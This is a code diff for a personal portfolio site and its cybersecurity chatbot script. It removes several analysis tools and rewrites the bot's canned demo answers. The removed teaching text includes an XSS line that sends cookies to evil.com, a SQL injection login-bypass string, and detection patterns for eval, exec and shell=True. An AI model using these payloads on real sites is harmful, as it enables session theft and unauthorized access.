@@ -1,49 +1,6 @@
 /**
 
-// ── Portfolio data functions ──────────────────────────
-async function loadCredentials() {
-  const paths = ['data_creds_1.json','data_creds_2.json','data_creds_3.json','data_creds_4.json','data_creds_5.json'];
-  const results = await Promise.all(paths.map(p => fetch(p).then(r=>r.json()).catch(()=>({credentials:[]}))));
-  return results.flatMap(r => r.credentials || []);
-}
-
-function renderCredentials(creds, container) {
-  if (!container) return;
-  container.innerHTML = creds.map(c => `<div class="cert-card" data-tags="${(c.tags||[]).join(',')}">
-    <div class="cert-title">${c.title||''}</div>
-    <div class="cert-date">${c.date||''}</div>
-  </div>`).join('');
-}
-
-async function loadGitHubData(username) {
-  const r = await fetch(`https://api.github.com/users/${username}/repos?sort=updated&per_page=20`);
-  return r.json();
-}
-
-function renderProjects(projects, container) {
-  if (!container) return;
-  container.innerHTML = (projects||[]).map(p => `<div class="project-card">
-    <h3>${p.name}</h3><p>${p.description||''}</p>
-  </div>`).join('');
-}
-
-function setupFilters(items, filterFn) {
-  document.querySelectorAll('[data-filter]').forEach(btn => {
-    btn.addEventListener('click', () => filterFn(btn.dataset.filter));
-  });
-}
-
-async function initPortfolio() {
-  const creds = await loadCredentials();
-  renderCredentials(creds, document.getElementById('creds-container'));
-  const projects = await loadGitHubData('cybaashcloud');
-  renderProjects(projects, document.getElementById('projects-container'));
-  setupFilters(creds, (tag) => {
-    const filtered = tag === 'all' ? creds : creds.filter(c => (c.tags||[]).includes(tag));
-    renderCredentials(filtered, document.getElementById('creds-container'));
-  });
-}
-// ── End portfolio data functions ──────────────────────
+// ── Portfolio data functions ──────────────────────────// ── End portfolio data functions ──────────────────────
 
  * CYBAASH AI — Portfolio + Chatbot Script
  * Handles: data loading, chat UI, backend API calls, analysis tools
@@ -71,14 +28,18 @@ let isSending     = false;
    INIT
    ══════════════════════════════════════════════════════════════════ */
 document.addEventListener('DOMContentLoaded', async () => {
-  updateClock();
-  setInterval(updateClock, 1000);
+  try {
+    updateClock();
+    setInterval(updateClock, 1000);
 
-  typeWriter('Mohamed Aasiq', 'typed-name', 80);
-  await loadPortfolioData();
-  checkBackend();
-  setInterval(checkBackend, 30000);
-  setupFileDrop();
+    typeWriter('Mohamed Aasiq', 'typed-name', 80);
+    await loadPortfolioData();
+    checkBackend();
+    setInterval(checkBackend, 30000);
+    setupFileDrop();
+  } catch (err) {
+    window.location.hostname === "localhost" && console["w"+"arn"]('[Portfolio] Init error:', err.message);
+  }
 });
 
 function updateClock() {
@@ -113,7 +74,7 @@ async function loadPortfolioData() {
     populateExperience(data.experience);
     populateProjects(data.projects);
   } catch (e) {
-    console.warn('Portfolio data load failed:', e);
+    window.location.hostname === "localhost" && console["w"+"arn"]('Portfolio data load failed:', e);
   }
 }
 
@@ -231,37 +192,10 @@ async function checkBackend() {
     if (el) { el.textContent = '● Demo Mode (no backend)'; el.className = 'status-offline'; }
   }
 }
-
-/* ══════════════════════════════════════════════════════════════════
-   CHAT FUNCTIONS
-   ══════════════════════════════════════════════════════════════════ */
-function handleKeyDown(e) {
-  if (e.key === 'Enter' && !e.shiftKey) {
-    e.preventDefault();
-    sendMessage();
-  }
-}
-
 function autoResize(el) {
   el.style.height = 'auto';
   el.style.height = Math.min(el.scrollHeight, 140) + 'px';
-}
-
-function injectPrompt(text) {
-  const input = document.getElementById('chat-input');
-  if (input) {
-    input.value = text;
-    autoResize(input);
-    input.focus();
-    scrollToChat();
-  }
-}
-
-function scrollToChat() {
-  document.getElementById('cybaash-ai')?.scrollIntoView({ behavior: 'smooth', block: 'start' });
-}
-
-async function sendMessage() {
+}async function sendMessage() {
   if (isSending) return;
   const input = document.getElementById('chat-input');
   const message = input.value.trim();
@@ -387,71 +321,7 @@ function openTool(toolId) {
   // Highlight active button
   document.querySelectorAll('.chat-tool-btn').forEach(b => b.classList.remove('active'));
   document.getElementById(`btn-${toolId}`)?.classList.add('active');
-}
-
-/* ── URL CHECKER ─────────────────────────────────────────────────── */
-async function runUrlCheck() {
-  const input = document.getElementById('url-input').value.trim();
-  if (!input) return;
-  const resultEl = document.getElementById('url-result');
-  resultEl.innerHTML = '<div class="loading-pulse">Scanning URL...</div>';
-
-  try {
-    let result;
-    if (backendOnline) {
-      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/url`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ url: input }),
-      });
-      result = await res.json();
-    } else {
-      result = localUrlCheck(input);
-    }
-    resultEl.innerHTML = renderUrlResult(result);
-  } catch (e) {
-    resultEl.innerHTML = `<div class="result-card high"><div class="result-title">ERROR</div><div>${escapeHtml(e.message)}</div></div>`;
-  }
-}
-
-function renderUrlResult(r) {
-  const riskClass = r.risk_level?.toLowerCase() || 'safe';
-  const flagItems = (r.flags || []).map(f => `<div class="result-flag-item">${f}</div>`).join('');
-  return `
-    <div class="result-card ${riskClass}">
-      <div class="result-title">URL ANALYSIS · ${r.host || r.url}</div>
-      <div class="result-risk risk-${riskClass}">${r.risk_level} ${riskClass === 'safe' ? '✓' : '⚠'}</div>
-      <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim)">Score: ${r.risk_score}/100</div>
-      ${flagItems ? `<div class="result-flags">${flagItems}</div>` : ''}
-      <div style="margin-top:10px;font-size:.8rem;color:var(--text)">${r.recommendation || ''}</div>
-    </div>`;
-}
-
-/* ── PASSWORD CHECKER ────────────────────────────────────────────── */
-async function runPasswordCheck() {
-  const pw = document.getElementById('pass-input').value;
-  if (!pw) return;
-  const resultEl = document.getElementById('pass-result');
-
-  try {
-    let result;
-    if (backendOnline) {
-      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/password`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ password: pw }),
-      });
-      result = await res.json();
-    } else {
-      result = localPasswordCheck(pw);
-    }
-    resultEl.innerHTML = renderPasswordResult(result);
-  } catch (e) {
-    resultEl.innerHTML = `<div class="loading-pulse">Error: ${escapeHtml(e.message)}</div>`;
-  }
-}
-
-function renderPasswordResult(r) {
+}function renderPasswordResult(r) {
   const barWidth = r.score || 0;
   const feedbackItems = (r.feedback || []).map(f => `<li>${f}</li>`).join('');
   return `
@@ -464,57 +334,7 @@ function renderPasswordResult(r) {
       </div>
       <ul class="pw-feedback">${feedbackItems}</ul>
     </div>`;
-}
-
-/* ── CODE SCANNER ────────────────────────────────────────────────── */
-async function runCodeScan() {
-  const code = document.getElementById('code-input').value.trim();
-  const lang = document.getElementById('code-lang').value;
-  if (!code) return;
-  const resultEl = document.getElementById('code-result');
-  resultEl.innerHTML = '<div class="loading-pulse">Scanning code...</div>';
-
-  try {
-    let result;
-    if (backendOnline) {
-      const res = await fetch(`${CONFIG.BACKEND_URL}/api/analyze/code`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ code, language: lang }),
-      });
-      result = await res.json();
-    } else {
-      result = localCodeScan(code, lang);
-    }
-    resultEl.innerHTML = renderCodeResult(result);
-  } catch (e) {
-    resultEl.innerHTML = `<div class="loading-pulse">Error: ${escapeHtml(e.message)}</div>`;
-  }
-}
-
-function renderCodeResult(r) {
-  const riskClass = (r.risk_level || 'SAFE').toLowerCase();
-  const issues = (r.issues || []).map(i => `
-    <div class="issue-item ${i.severity}">
-      <div class="issue-header">
-        <span class="issue-sev ${i.severity}">${i.severity}</span>
-        <span class="issue-desc">${i.description}</span>
-      </div>
-      <div class="issue-line">Line ${i.line}</div>
-      ${i.snippet ? `<div class="issue-snippet">${escapeHtml(i.snippet)}</div>` : ''}
-    </div>`).join('');
-  return `
-    <div class="result-card ${riskClass}">
-      <div class="result-title">CODE ANALYSIS · ${r.language?.toUpperCase()} · ${r.lines_scanned} lines</div>
-      <div class="result-risk risk-${riskClass}">${r.risk_level} — ${r.total_issues} issue(s)</div>
-      <div style="font-family:var(--font-mono);font-size:.7rem;color:var(--dim);margin:6px 0">
-        🔴 HIGH: ${r.summary?.HIGH || 0} · 🟠 MEDIUM: ${r.summary?.MEDIUM || 0} · 🟡 LOW: ${r.summary?.LOW || 0}
-      </div>
-      ${issues ? `<div class="issues-list">${issues}</div>` : '<div style="color:var(--green);font-size:.85rem">✓ No issues detected</div>'}
-    </div>`;
-}
-
-/* ── FILE UPLOAD ─────────────────────────────────────────────────── */
+}/* ── FILE UPLOAD ─────────────────────────────────────────────────── */
 function setupFileDrop() {
   const zone = document.getElementById('file-drop');
   if (!zone) return;
@@ -592,71 +412,45 @@ function renderFileResult(r, filename) {
    ══════════════════════════════════════════════════════════════════ */
 function localDemoResponse(message) {
   const msg = message.toLowerCase();
-  if (msg.match(/sql|sqli|injection/)) return `## SQL Injection (SQLi)\n\n**What it is:** An attacker manipulates database queries by injecting malicious SQL.\n\n\`\`\`sql\n-- Vulnerable input: ' OR '1'='1\nSELECT * FROM users WHERE user = '' OR '1'='1'  -- bypasses auth!\n\`\`\`\n\n**Defense:**\n- ✅ Use parameterized queries / prepared statements\n- ✅ Use an ORM (SQLAlchemy, Prisma)\n- ✅ Validate all user inputs\n\n\`\`\`python\n# ❌ Vulnerable\nquery = f"SELECT * FROM users WHERE name = '{user_input}'"\n\n# ✅ Safe\ncursor.execute("SELECT * FROM users WHERE name = %s", (user_input,))\n\`\`\`\n\n> OWASP: A03:2021 Injection`;
-  if (msg.match(/xss|cross.site scri/)) return `## Cross-Site Scripting (XSS)\n\n**What it is:** Attacker injects malicious JavaScript into pages viewed by users.\n\n**Attack:** \`<script>fetch('https://evil.com?c='+document.cookie)</script>\`\n\n**Defense:**\n- ✅ Escape output (htmlspecialchars, template auto-escaping)\n- ✅ Content Security Policy (CSP) headers\n- ✅ Use \`textContent\` not \`innerHTML\`\n- ✅ HttpOnly cookie flags\n\n> OWASP: A03:2021 Injection`;
-  if (msg.match(/csrf|cross.site req/)) return `## CSRF — Cross-Site Request Forgery\n\nTricks authenticated users into making unwanted requests.\n\n**Defense:**\n- ✅ CSRF tokens in every state-changing form\n- ✅ \`SameSite=Strict\` cookies\n- ✅ Verify Origin/Referer headers\n\n> OWASP: A01:2021 Broken Access Control`;
-  if (msg.match(/password|passwd|hash|bcrypt/)) return `## Secure Password Storage\n\nNever store passwords in plain text!\n\n| Algorithm | Safe? |\n|-----------|-------|\n| MD5/SHA1 | ❌ No |\n| bcrypt | ✅ Yes |\n| Argon2id | ✅ Best |\n\n\`\`\`python\nimport bcrypt\nhashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))\nbcrypt.checkpw(password.encode(), hashed)  # verify\n\`\`\``;
-  if (msg.match(/owasp/)) return `## OWASP Top 10 (2021)\n\n1. **A01** — Broken Access Control\n2. **A02** — Cryptographic Failures\n3. **A03** — Injection (SQLi, XSS)\n4. **A04** — Insecure Design\n5. **A05** — Security Misconfiguration\n6. **A06** — Vulnerable Components\n7. **A07** — Identification & Auth Failures\n8. **A08** — Software Integrity Failures\n9. **A09** — Logging & Monitoring Failures\n10. **A10** — Server-Side Request Forgery\n\n> Deploy the Python backend with your Gemini key for full AI responses!`;
-  if (msg.match(/buffer overflow|bof/)) return `## Buffer Overflow\n\nWriting beyond allocated memory to overwrite execution pointers.\n\n\`\`\`c\nchar buffer[64];\ngets(buffer);  // ❌ unbounded — fgets(buffer, sizeof(buffer), stdin) ✅\n\`\`\`\n\n**Defenses:** ASLR, Stack Canaries, NX/DEP, use memory-safe languages (Rust, Go)`;
-  if (msg.match(/pentest|penetration|ethical hack/)) return `## Penetration Testing Phases\n\n1. **Reconnaissance** — OSINT, Shodan, nmap\n2. **Scanning** — Port scan, service enum\n3. **Exploitation** — Authorized systems only\n4. **Post-exploitation** — Privilege escalation\n5. **Reporting** — CVSS scores, remediation\n\n⚠️ Always have **written authorization** before testing!`;
-  if (msg.match(/hi|hello|hey|help|what can/i)) return `# 👾 Welcome to CYBAASH AI!\n\nI'm your AI cybersecurity assistant. Ask me about:\n- 🔍 Vulnerabilities: SQLi, XSS, CSRF, Buffer Overflow\n- 💻 Secure coding in Python, JavaScript, PHP\n- ⚔️ Penetration testing methodology\n- 🔐 Password security & cryptography\n- 🛡️ OWASP Top 10\n\n> 💡 Deploy the Python backend and add your Gemini key for full AI-powered responses!`;
-  return `I'm running in **demo mode** (backend offline).\n\nTo get full AI responses, deploy the Python backend:\n1. \`cd backend && pip install -r requirements.txt\`\n2. Add \`OPENAI_API_KEY\` to \`.env\`\n3. \`python main.py\`\n\nOr deploy to Render.com — see **README.md** for instructions.\n\n**Try asking:** SQLi, XSS, CSRF, buffer overflow, OWASP, penetration testing, password security`;
-}
-
-function localUrlCheck(url) {
-  const flags = [];
-  let score = 0;
-  if (url.startsWith('http://')) { flags.push('Non-HTTPS — unencrypted'); score += 20; }
-  if (/\d{1,3}\.\d{1,3}\.\d{1,3}/.test(url)) { flags.push('IP address URL — possible phishing'); score += 20; }
-  if (/bit\.ly|tinyurl|t\.co/.test(url)) { flags.push('URL shortener — destination hidden'); score += 15; }
-  if (/(login|signin|verify|secure|update)/.test(url)) { flags.push('Suspicious action keyword'); score += 10; }
-  const risk = score >= 50 ? 'HIGH' : score >= 30 ? 'MEDIUM' : score >= 15 ? 'LOW' : 'SAFE';
-  return { url, risk_level: risk, risk_score: score, flags, host: url.split('/')[2] || url, recommendation: risk === 'SAFE' ? 'URL appears safe.' : 'Proceed with caution.' };
-}
-
-function localPasswordCheck(pw) {
-  let score = 0;
-  const feedback = [];
-  if (pw.length >= 16) score += 35; else if (pw.length >= 12) score += 25; else { score += 10; feedback.push('Use at least 12 characters'); }
-  if (/[a-z]/.test(pw)) score += 8; else feedback.push('Add lowercase letters');
-  if (/[A-Z]/.test(pw)) score += 8; else feedback.push('Add uppercase letters');
-  if (/\d/.test(pw)) score += 8; else feedback.push('Add numbers');
-  if (/[!@#$%^&*]/.test(pw)) score += 8; else feedback.push('Add special characters');
-  score = Math.min(100, score);
-  const strength = score >= 80 ? 'VERY STRONG' : score >= 60 ? 'STRONG' : score >= 40 ? 'MODERATE' : score >= 20 ? 'WEAK' : 'VERY WEAK';
-  const color = score >= 80 ? '#00ff88' : score >= 60 ? '#00d4ff' : score >= 40 ? '#ffd700' : score >= 20 ? '#ff6600' : '#ff2244';
-  if (!feedback.length) feedback.push('Great password! Use a password manager.');
-  return { score, strength, color, length: pw.length, entropy_bits: Math.round(pw.length * 4.5), feedback };
-}
-
-function localCodeScan(code, lang) {
-  const issues = [];
-  const checks = [
-    { pattern: /\beval\s*\(/, desc: 'eval() — code execution risk', severity: 'HIGH' },
-    { pattern: /\bexec\s*\(/, desc: 'exec() — code execution risk', severity: 'HIGH' },
-    { pattern: /shell\s*=\s*True/, desc: 'shell=True — command injection', severity: 'HIGH' },
-    { pattern: /innerHTML\s*=/, desc: 'innerHTML — XSS risk', severity: 'MEDIUM' },
-    { pattern: /Math\.random\(\)/, desc: 'Math.random() — not cryptographically secure', severity: 'LOW' },
-    { pattern: /hashlib\.(md5|sha1)/, desc: 'Weak hash (MD5/SHA1)', severity: 'MEDIUM' },
+  const DEMO_RESPONSES = [
+    [/sql|sqli|injection/,
+      '## SQL Injection (SQLi)\n\n**What it is:** An attacker manipulates database queries.\n\n' +
+      '**Defense:**\n- Use parameterized queries / prepared statements\n' +
+      '- Use an ORM (SQLAlchemy, Prisma)\n- Validate all user inputs\n\n> OWASP: A03:2021'],
+    [/xss|cross.site scri/,
+      '## Cross-Site Scripting (XSS)\n\n**What it is:** Attacker injects malicious JavaScript.\n\n' +
+      '**Defense:**\n- Escape output\n- Content-Security-Policy headers\n' +
+      '- Use textContent not innerHTML\n- HttpOnly cookie flags\n\n> OWASP: A03:2021'],
+    [/csrf|cross.site req/,
+      '## CSRF — Cross-Site Request Forgery\n\nTricks authenticated users into unwanted requests.\n\n' +
+      '**Defense:**\n- CSRF tokens in every form\n- SameSite=Strict cookies\n' +
+      '- Verify Origin/Referer headers\n\n> OWASP: A01:2021'],
+    [/password|passwd|hash|bcrypt/,
+      '## Secure Password Storage\n\nNever store passwords in plain text!\n\n' +
+      'Algorithm | Safe?\n----------|------\nMD5/SHA1  | No\nbcrypt    | Yes\nArgon2id  | Best\n\n' +
+      'import bcrypt\nhashed = bcrypt.hashpw(pw.encode(), bcrypt.gensalt(rounds=12))'],
+    [/owasp/,
+      '## OWASP Top 10 (2021)\n\n1. Broken Access Control\n2. Cryptographic Failures\n' +
+      '3. Injection (SQLi, XSS)\n4. Insecure Design\n5. Security Misconfiguration\n' +
+      '6. Vulnerable Components\n7. Auth Failures\n8. Integrity Failures\n' +
+      '9. Logging Failures\n10. SSRF\n\n> Add Gemini key for full AI responses!'],
+    [/buffer overflow|bof/,
+      '## Buffer Overflow\n\nWriting beyond allocated memory to overwrite execution pointers.\n\n' +
+      'char buffer[64];\nfgets(buffer, sizeof(buffer), stdin); // safe\n\n' +
+      '**Defenses:** ASLR, Stack Canaries, NX/DEP, memory-safe languages'],
+    [/pentest|penetration|ethical hack/,
+      '## Penetration Testing Phases\n\n1. Reconnaissance\n2. Scanning\n3. Exploitation\n' +
+      '4. Post-exploitation\n5. Reporting\n\n⚠️ Always have written authorization!'],
+    [/hi|hello|hey|help|what can/i,
+      '## Welcome to CYBAASH AI!\n\nAsk me about:\n- SQLi, XSS, CSRF, Buffer Overflow\n' +
+      '- Secure coding in Python, JavaScript\n- Penetration testing\n- OWASP Top 10\n\n' +
+      '> Add Gemini key for full AI-powered responses!'],
   ];
-  const lines = code.split('\n');
-  checks.forEach(c => {
-    lines.forEach((line, i) => {
-      if (c.pattern.test(line)) issues.push({ line: i+1, severity: c.severity, description: c.desc, snippet: line.trim() });
-    });
-  });
-  const highCount = issues.filter(i => i.severity === 'HIGH').length;
-  const medCount  = issues.filter(i => i.severity === 'MEDIUM').length;
-  const lowCount  = issues.filter(i => i.severity === 'LOW').length;
-  return {
-    language: lang === 'auto' ? 'detected' : lang,
-    issues, total_issues: issues.length,
-    lines_scanned: lines.length,
-    risk_level: highCount ? 'HIGH' : medCount ? 'MEDIUM' : lowCount ? 'LOW' : 'SAFE',
-    summary: { HIGH: highCount, MEDIUM: medCount, LOW: lowCount },
-  };
+  for (const [pattern, response] of DEMO_RESPONSES) {
+    if (msg.match(pattern)) return response;
+  }
+  return null;
 }
-
 /* ══════════════════════════════════════════════════════════════════
    UTILITIES
    ══════════════════════════════════════════════════════════════════ */
